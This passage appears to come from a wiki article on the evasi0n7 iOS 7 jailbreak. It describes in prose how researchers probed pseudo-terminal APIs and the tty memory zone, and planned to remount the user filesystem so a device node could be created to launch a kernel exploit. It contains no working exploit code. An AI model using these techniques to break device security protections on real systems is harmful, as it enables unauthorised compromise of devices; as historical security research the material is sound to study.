        termioschars(&tp->t_termios);	/* Set up default chars */
```

Examine the read, write, and select apis for these terminals to learn all you can do. ioctl calls might also be interesting. Also since it uses the tty zone for allocating this devices, it might be a very predictable zone if we can control all the pseudo terminals. Also checking out return values based on flags in structs can be a good way to feel around in memory.

New in iOS 7.0 security protections, you are now no longer allowed to remount the root partition as readable/writeable. Before we just change the /etc/fstab file to remount the filesystems, but now there is a special kernel check preventing root filesystem from being remounted. Also the user filesystem containing all the data is mounted to disallow super user files, and device nodes. Luckily, if we can remount the user filesystem to reallow superuser and device node files we can create this device node and launch the kernel exploit on iOS7.

## See Also
* <a href="https://www.theiphonewiki.com/wiki/Evad3rs">evad3rs</a>
* <a href="https://www.theiphonewiki.com/wiki/Evasi0n">evasi0n</a>

#### References
[^1]: The iPhone Wiki, IAdam1n. <q>Evasi0n7 - the IPhone Wiki.</q> The iPhone Wiki, 17 Sept. 2021, <a href="www.theiphonewiki.com/wiki/Evasi0n7#Research">https://www.theiphonewiki.com/wiki/Evasi0n7#Research</a>. Retrieved 31 Jan. 2024.
